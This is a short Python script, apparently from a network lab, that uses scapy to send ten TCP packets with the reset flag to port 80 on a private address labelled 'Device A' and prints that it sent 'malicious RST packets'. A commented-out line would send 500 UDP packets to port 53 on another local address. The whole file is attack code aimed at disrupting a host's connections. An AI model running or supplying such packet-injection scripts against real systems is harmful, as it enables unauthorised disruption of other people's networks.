# from scapy.all import send, IP, UDP
# send(IP(dst="192.168.1.1")/UDP(dport=53), count=500)
from scapy.all import send, IP, TCP
target_ip = "172.22.58.93"  # Device A's IP
pkt = IP(dst=target_ip) / TCP(dport=80, flags="R")
send(pkt, count=10)
print("Sent 10 malicious RST packets.")
